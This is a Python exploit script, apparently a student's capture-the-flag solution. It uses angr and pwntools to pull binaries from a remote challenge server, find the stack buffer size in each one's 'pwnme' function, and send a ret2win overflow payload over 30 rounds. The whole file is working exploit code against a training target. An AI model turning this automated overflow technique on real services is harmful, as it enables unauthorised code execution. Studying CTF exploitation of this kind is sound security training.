import os
os.environ['PWNLIB_NOTERM'] = 'True'  # Configuration patch to allow pwntools to be run inside of an IDE
os.environ['PWNLIB_SILENT'] = 'True'
from pwn import *
import angr
import claripy
import sys
import io
import base64
from angr.storage.file import SimFileStream

HOST = "svtctf.m0lecon.it" 
PORT = 13475

def angr_find_sol(binary_data):
    #path_to_binary = '/home/kali/Desktop/svt/Lab05/angr_symbolic_registers'
    #binary_data = b"..."
    # Wrap bytes in BytesIO to simulate a file stream that angr loader can read.
    binary_stream = io.BytesIO(binary_data)

    project = angr.Project(binary_stream, auto_load_libs=False)

    
    obj = project.loader.main_object
    
    # 1. Get the real address of pwnme func
    pwnme_addr = obj.get_symbol("pwnme").rebased_addr

    off_from_pwnme = 0x00401185 - 0x0040116c     #from first binary, structure is the same
    
    buff_len_inst_address = pwnme_addr + off_from_pwnme # addr of instruction: lea rax, [rbp - OFFSET]
    #buffer is at rbp-offset and has offset bytes

    block = project.factory.block(buff_len_inst_address, size=16)

    for insn in block.capstone.insns:
        if insn.mnemonic == 'lea' and 'rbp -' in insn.op_str:
            # Extract the hex value after minus
            # op_str example: "rax, [rbp - 0xe]"
            import re
            match = re.search(r'rbp - (0x[0-9a-f]+)', insn.op_str)
            if match:
                buffer_offset = int(match.group(1), 16)
                print(buffer_offset)
                break
        else:
            raise Exception("Buffer len instruction not found")

    win_addr = obj.get_symbol("win").rebased_addr

    # Payload
    # [Null Byte] + [Junk] + [win Address]
    # Total distance to RIP = buffer_offset + 8 (saved rbp)
    
    padding_len = buffer_offset + 8
    
    # \x00 at start to bypass the XOR loop
    payload = b'\x00' + b'A' * (padding_len - 1) + p64(win_addr)
    
    return payload


    
def main():
    server = remote(HOST, PORT)
    #server.interactive()
    #server.recvuntil(b">")
    #server.sendline(b"0")

    for i in range (0,30):
        a = server.recvuntil(b"-----BEGIN BINARY-----\n")
        print(a)
        b64_bin = server.recvuntil(b"\n").strip().decode()
        bin = base64.b64decode(b64_bin)
        #print(b64_bin)
        with open("recv_bin", "wb") as f:
            f.write(bin)

        payload_bin = angr_find_sol(bin)
        print(f"Sending payload {payload_bin} of length {len(payload_bin)}")
        print(server.recvuntil(b'Welcome to the string mixer. Send me some data:\n'))
        server.sendline(payload_bin)



    # read remainder of program output
    server.interactive()


if __name__ == '__main__':
  main()